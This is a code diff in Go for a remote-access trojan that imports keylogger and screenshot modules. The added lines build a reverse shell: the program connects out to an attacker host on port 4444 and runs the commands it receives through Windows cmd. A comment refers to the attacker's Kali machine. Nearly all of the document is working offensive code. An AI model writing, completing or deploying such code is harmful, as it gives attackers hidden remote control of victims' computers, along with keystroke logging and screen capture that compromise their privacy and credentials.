@@ -11,11 +11,20 @@ import (
     "./keylogger"
     "./screenshot"
 )
-
-const (
-    LHOST = "192.168.1.10" // Replace with your Kali IP
+func getLocalAttackerIP() string {
+    conn, err := net.Dial("udp", "8.8.8.8:80")
+    if err != nil {
+        return "127.0.0.1"
+    }
+    defer conn.Close()
+    localAddr := conn.LocalAddr().(*net.UDPAddr)
+    return localAddr.IP.String()
+}
+var (
+    LHOST = getLocalAttackerIP()
     LPORT = "4444"
 )
+
 
 func handleConnection(conn net.Conn) {
     defer conn.Close()
@@ -61,6 +70,19 @@ func handleConnection(conn net.Conn) {
         }
     }
 }
-
 func runShellCommand(cmd string) string {
-    out, err := exec.Command("cmd", "/C", cmd).CombinedOutpu
+    out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
+    if err != nil {
+        return fmt.Sprintf("[!] Command error: %s\n", err)
+    }
+    return string(out)
+}
+func main() {
+    conn, err := net.Dial("tcp", LHOST+":"+LPORT)
+    if err != nil {
+        return
+    }
+    handleConnection(conn)
+}
+
+
